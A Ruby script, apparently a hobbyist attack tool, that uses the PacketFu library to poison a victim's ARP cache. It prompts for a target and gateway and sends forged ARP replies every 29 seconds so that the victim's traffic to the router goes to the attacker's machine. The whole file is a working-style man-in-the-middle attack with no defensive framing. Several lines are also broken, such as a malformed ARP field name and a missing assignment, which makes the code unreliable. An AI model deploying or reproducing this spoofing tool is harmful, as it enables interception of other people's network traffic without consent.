#!/usr/bin/env ruby

require 'packetfu'
require 'socket'

def poison(lip, lmac, vip, vmac, rip, int_name)
  puts "Sending ARP Packet Spoof every 29 seconds"
  x = PacketFu::ARPPacket.new(:flavour => "Linux")
    x.eth_saddr = lmac      #my Mac Address
    x.eth_daddr = vmac      #target Mac Address
    x.arp_saddr_mac = lmac
    x.arp_daddr_mac = vmac
    x.arp_saddr_ip = rip    #router IP Address
    x.arp.daddr_ip = vip    #target IP Address
    x.arp_opcode = 2
  while true do
    x.to_w(int_name)        #Put packet to wire interface
     sleep(29)
  end
end


def get_ifconfig(int_name)
  int_config = PacketFu::Utils.whoami?(:iface => int_name)
  return int_config[:ip_saddr], int_config[:eth_saddr]
end


def get_target_info
  puts "enter target ip"
  vip = gets
  puts "enter target MAC"
  vmac = gets
  puts "enter gateway ip"
  rip gets
  return vip, vmac, rip
end

#run as root
unless Process.uid.zero?
  puts "you need to run script as root!"
  exit 0
end

#select interface to use and start setup
interfaces = Socket.getifaddrs.map { |i| i.name }.compact.uniq
list = Hash[(0...interfaces.size).zip interfaces]
list.each do |l, v|
  puts "#{l} #{v}"
end

puts "enter inteface number to use"
int_number = gets
if list.key?(int_number.to_i)
  lip, lmac = get_ifconfig(list.fetch(int_number.to_i))
  vip, vmac, rip = get_target_info()
  poison(lip, lmac, vip, vmac, rip, list.fetch(int_number.to_i))
else
  puts "Selected interface does not exist"
end
